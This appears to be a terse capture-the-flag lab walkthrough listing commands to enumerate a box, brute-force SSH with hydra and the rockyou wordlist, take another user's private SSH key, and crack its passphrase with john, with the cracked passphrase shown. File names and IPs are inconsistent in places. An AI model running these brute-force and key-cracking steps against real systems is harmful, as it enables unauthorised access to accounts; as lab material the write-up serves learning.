After nmap

dirbuster on the IP address >> directory-list-1

find users
>> enum4linux -e 10.10.77.142

find password
>> sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.77.142

After we login as Jan we go up in the directory tree and enter to Kay's directory.

In Kay's directory we find hidden files with ">> ls -la"
We cannot open any of them but enter to ".ssh" directory. This directory contains a public key "id_rsa".

> "cat" the file manually copy the text and paste into your own directory as "id_rsa_key" 

Now we need to change the text to readable format by "john", so we do;
>> ssh2john id_rsa_kay > john.txt
>> john --wordlist=/usr/share/wordlists/rockyou.txt john.txt 
output: beeswax          (id_rsa_kay)

>> ssh -i id_rsa kay@10.10.15.38
